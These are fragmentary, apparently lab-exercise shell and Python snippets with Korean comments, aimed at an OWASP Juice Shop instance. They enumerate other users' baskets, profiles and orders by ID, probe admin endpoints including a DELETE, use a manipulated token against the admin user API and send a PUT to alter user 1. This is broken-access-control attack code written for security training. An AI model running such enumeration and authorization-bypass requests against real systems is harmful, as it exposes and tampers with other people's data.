...
curl -s http://juice.6v6.lab/rest/basket/1 \
...
for basket_id in 1 2 3 4 5; do
  read code size < <(curl -s -o /tmp/basket.json -w "%{http_code} %{size_download}" \
    "http://juice.6v6.lab/rest/basket/$basket_id" -H "Authorization: Bearer $TOKEN1")
...
for user_id in 1 2 3 4 5; do
  result=$(curl -s -w "::%{http_code}" "http://juice.6v6.lab/api/Users/$user_id" -H "Authorization: Bearer $TOKEN1")
...
for order_id in 1 2 3 4 5; do                          # 반복문 시작
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://juice.6v6.lab/rest/track-order/$order_id \
...
token = None
# 로그인
r = requests.post("http://juice.6v6.lab/rest/user/login",
...
for ep in endpoints:                                   # 반복문 시작
    ...
    for test_id in [1, 2, 99]:                         # 반복문 시작
        url = f"http://juice.6v6.lab{ep.replace('{id}', str(test_id))}"
        try:
...
test_admin GET    http://juice.6v6.lab/administration              "관리자 페이지"
test_admin GET    http://juice.6v6.lab/api/Users/                  "사용자 목록"
test_admin DELETE http://juice.6v6.lab/api/Feedbacks/1             "피드백 삭제"
test_admin GET    http://juice.6v6.lab/api/Recycles/               "재활용 관리"
```
...
# 조작된 토큰으로 관리자 API 접근
r = requests.get("http://juice.6v6.lab/api/Users/",
...
curl -s -X PUT http://juice.6v6.lab/api/Users/1 \
  -H "Content-Type: application/json" \
...
TARGET="http://juice.6v6.lab/api/Users/"
printf "%-10s %-8s %s\n" "method" "code" "verdict"
...
for path in "${PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://juice.6v6.lab$path" -H "Authorization: Bearer $TOKEN1")
  printf "%-30s %-8s\n" "$path" "$code"
done
```
